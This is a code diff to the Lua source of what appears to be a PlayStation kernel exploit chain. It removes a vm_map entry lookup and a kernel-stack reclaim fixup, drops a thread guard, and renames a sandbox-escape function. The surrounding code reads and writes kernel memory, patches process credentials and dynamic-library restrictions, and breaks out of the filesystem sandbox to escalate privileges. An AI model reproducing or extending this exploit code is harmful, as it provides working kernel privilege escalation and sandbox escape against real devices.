@@ -64,11 +64,6 @@ OFFSET_UIO_RESID = 0x18
 OFFSET_UIO_SEGFLG = 0x20
 OFFSET_UIO_RW = 0x24
 
-OFFSET_VM_MAP_ENTRY_LEFT = 0x10
-OFFSET_VM_MAP_ENTRY_RIGHT = 0x18
-OFFSET_VM_MAP_ENTRY_START = 0x20
-OFFSET_VM_MAP_ENTRY_END = 0x28
-OFFSET_VM_MAP_ROOT = 0x1c8
 OFFSET_VM_MAP_ENTRY_OBJECT = 80
 OFFSET_VM_OBJECT_REF_COUNT = 132
 
@@ -335,17 +330,12 @@ function prim_thread:new(chain)
     local self = setmetatable({}, prim_thread)    
     
     self.chain = chain
-    self.tid = -1
 
     return self
 end
 
 -- run ropchain in primitive thread
 function prim_thread:run()
-
-    if self.tid ~= -1 then
-        error("prim_thread:run() - previous thread execution isnt yet closed")
-    end
 
     if not self.ready then
         self:prepare_structure()
@@ -1115,7 +1105,7 @@ function get_kprim_curthr_from_kstack()
         return a.val > b.val
     end)
 
-    -- get heap ptrs with most occurences
+    -- get kernel address in kstack with most occurences
     local curthr_addr = uint64(select(2, next(dict)).key)
     return curthr_addr
 end
@@ -1144,33 +1134,6 @@ function find_allproc()
     end
 
     error("failed to find allproc")
-end
-
-
-
--- credit - https://github.com/ps5-payload-dev/sdk/pull/11
-function find_vmmap_entry(addr, proc)
-
-    assert(addr and proc)
-
-    local vmspace_addr = kernel.read_qword(proc + OFFSET_P_VM_SPACE)    
-    local entry = kernel.read_qword(vmspace_addr + OFFSET_VM_MAP_ROOT)
-
-    while entry.l ~= 0 do
-
-        local start_addr = kernel.read_qword(entry + OFFSET_VM_MAP_ENTRY_START)
-        local end_addr = kernel.read_qword(entry + OFFSET_VM_MAP_ENTRY_END)
-
-        if addr < start_addr then
-            entry = kernel.read_qword(entry + OFFSET_VM_MAP_ENTRY_LEFT)
-        elseif addr > end_addr then
-            entry = kernel.read_qword(entry + OFFSET_VM_MAP_ENTRY_RIGHT)
-        else
-            return entry -- found vm entry
-        end
-    end
-
-    return nil
 end
 
 
@@ -1259,29 +1222,6 @@ function fixup_thread_kstack()
 end
 
 
--- for mapped memory areas which did not successfully receive kstack and were not upmapped,
--- increase the reference count so that kernel does not attempt to free them
-function fixup_failed_kstack_reclaim()
-
-    local fixup_count = 0
-
-    for i, kstack in ipairs(umtx.data.kstack_tofix) do
-        local entry = find_vmmap_entry(kstack, kernel.addr.curproc)
-        if entry then
-            local obj_addr = kernel.read_qword(entry + OFFSET_VM_MAP_ENTRY_OBJECT)
-            kernel.write_dword(obj_addr + OFFSET_VM_OBJECT_REF_COUNT, 0x10)
-            fixup_count = fixup_count + 1
-            break
-        end
-    end
-
-    if fixup_count ~= #umtx.data.kstack_tofix then
-        printf("failed to fix all vm entry kstack. fixup_count = %d expected fixup %d",
-            fixup_count, #umtx.data.kstack_tofix)
-    end
-end
-
-
 function fixup_corruption()
 
     assert(kernel.addr.kprim_curthr and kernel.addr.curproc_ofiles)
@@ -1294,15 +1234,12 @@ function fixup_corruption()
 
     dbg("fix up thread kstack")
     fixup_thread_kstack()
-
-    -- dbg("fix up failed kstack reclaim")
-    -- fixup_failed_kstack_reclaim() -- buggy
     
     print("fixes applied")
 end
 
 
-function break_fs_sandbox(proc)
+function escape_filesystem_sandbox(proc)
     
     local proc_fd = kernel.read_qword(proc + OFFSET_P_FD) -- p_fd
     local rootvnode = kernel.read_qword(kernel.addr.data_base + kernel_offset.DATA_BASE_ROOTVNODE)
@@ -1360,7 +1297,7 @@ function escalate_curproc()
 
     patch_ucred(ucred, authid)
     patch_dynlib_restriction(proc)
-    break_fs_sandbox(proc)
+    escape_filesystem_sandbox(proc)
 
     local uid_after = syscall.getuid():tonumber()
     local in_sandbox_after = syscall.is_in_sandbox():tonumber()
